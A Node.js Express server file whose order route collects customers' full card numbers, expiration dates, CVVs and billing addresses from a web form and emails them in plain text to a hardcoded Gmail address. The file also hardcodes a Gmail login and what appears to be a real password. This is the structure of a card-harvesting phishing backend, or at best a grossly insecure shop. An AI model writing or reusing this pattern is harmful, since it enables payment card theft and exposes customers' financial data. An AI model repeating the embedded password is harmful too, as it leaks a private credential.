const express = require('express');
const bodyParser = require('body-parser');
const nodemailer = require('nodemailer');
const cors = require('cors');
const path = require('path');

const app = express();
const PORT = 3000;

// Middleware
app.use(cors());
app.use(bodyParser.json());

// Serve static files from the current directory
app.use(express.static(path.join(__dirname)));

// Nodemailer Transporter
const transporter = nodemailer.createTransport({
  service: 'gmail',
  auth: {
    user: 'gillzilla.productions@gmail.com', // Replace with your Gmail address
    pass: '!Sweety4!', // Replace with your Gmail app password
  },
});

// Route to handle order submission
app.post('/submit-order', (req, res) => {
  const { email, cardNumber, expiration, cvv, address } = req.body;

  const mailOptions = {
    from: 'your-email@gmail.com', // Replace with your Gmail address
    to: 'gillzilla.productions@gmail.com', // Replace with the recipient email
    subject: 'New Order Received',
    text: `
      A new order has been placed:
      - Email: ${email}
      - Card Number: ${cardNumber}
      - Expiration Date: ${expiration}
      - CVV: ${cvv}
      - Billing Address: ${address}
    `,
  };

  transporter.sendMail(mailOptions, (error, info) => {
    if (error) {
      console.error(error);
      res.status(500).send('Error sending email');
    } else {
      console.log('Email sent: ' + info.response);
      res.status(200).send('Order submitted successfully');
    }
  });
});

// Route to serve the homepage
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

// Start the server
app.listen(PORT, () => {
  console.log(`Server running on http://localhost:${PORT}`);
});